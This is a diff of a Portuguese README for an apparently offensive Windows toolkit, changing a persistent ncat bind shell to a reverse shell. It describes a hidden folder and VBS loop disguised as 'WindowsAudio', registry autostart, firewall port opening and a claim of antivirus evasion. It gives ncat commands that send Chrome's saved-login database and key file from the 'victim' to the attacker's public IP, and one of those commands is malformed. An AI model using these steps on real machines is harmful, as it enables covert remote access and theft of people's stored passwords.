@@ -21,10 +21,10 @@ Bind Shell persistente no Windows via NCAT (Nmap).
 | 2 | Instalar o **WinGet** via curl
 | 3 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
 | 4 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
-| 5 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575-5580** |
+| 5 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575** |
 | 6 | Cria `audio.bat` - Executa o .vbs e fecha |
 | 7 | Adiciona ao Registro - Inicia junto com Windows (`WindowsAudio`) |
-| 8 | Abre o ranger de portas 5575-5580 de entrada e saida.
+| 8 | Abre a porta 5575 de entrada e saida.
 | 9 | Sobe o listener imediatamente |
 
 ---
@@ -32,20 +32,20 @@ Bind Shell persistente no Windows via NCAT (Nmap).
 ## ▶️ Como usar
 
 ### 1. Na vítima (Windows)
-- `Install_Full.bat` Windows 10 recem instalado, somente com Windows Defender padrão (Shell Persistente)
+- `Install_Full_Reverse.bat` Windows 10 recem instalado, somente com Windows Defender padrão (Shell Reverse Persistente)
   
-- `Install_Nmap.bat` Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Persistente)
+- `Install_Nmap_Reverse.bat` Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Reverse Persistente)
   
-- `Install_Shell.bat` Windows 10/11 já com winget sem nmap, pode ter antivirus instalado, não detecta.
-OBS: Após executar o Install_Shell.bat e obter acesso à shell, recomenda-se copiar e colar imediatamente todo o conteúdo do arquivo `Persistência.txt` para manter uma shell persistente.
+- `Install_Shell_Reverse.bat` Windows 10/11 já com winget sem nmap, pode ter antivirus instalado, não detecta.
+OBS: Após executar o Install_Shell_Reverse.bat e obter acesso à shell, recomenda-se copiar e colar imediatamente todo o conteúdo do arquivo `Persistência.txt` para manter uma shell persistente.
 
 ### 2. No atacante
 ```bash
 # Windows (via ncat)
-ncat IP_DA_VITIMA 5575
+ncat -lnvp 5575
 
 # Linux (via nc)
-nc IP_DA_VITIMA 5575
+nc -lnvp 5575
 ```
 
 ---
@@ -75,12 +75,12 @@ rmdir /s /q "%USERPROFILE%\WindowsAudio"
 
 **No shell Windows conectado:**
 ```cmd
-ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
+ncat SEU_IP_PUBLICO 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
 ```
 
 **No Linux (outro terminal):**
 ```bash
-ncat IP_DA_VITIMA 5581 < /caminho/do/arquivo.jpg
+ncat -lnvp 5581 < /caminho/do/arquivo.jpg
 ```
 
 ---
@@ -127,24 +127,24 @@ copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPRO
 
 **No Windows (shell conectado):**
 ```cmd
-ncat -lnp 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
+ncat -SEU_IP_PUBLICO 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
 ```
 
 **No Linux (outro terminal):**
 ```bash
-ncat IP_DA_VITIMA 5581 > LoginData.db
+ncat -lnvp 5581 > LoginData.db
 ```
 
 **Repita para o LocalState (use porta 5582):**
 
 **No Windows:**
 ```cmd
-ncat -lnp 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
+ncat SEU_IP_PUBLICO 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
 ```
 
 **No Linux:**
 ```bash
-ncat IP_DA_VITIMA 5582 > LocalState.json
+ncat -lnvp 5582 > LocalState.json
 ```
 
 ### 3. Instalar dependência no Linux
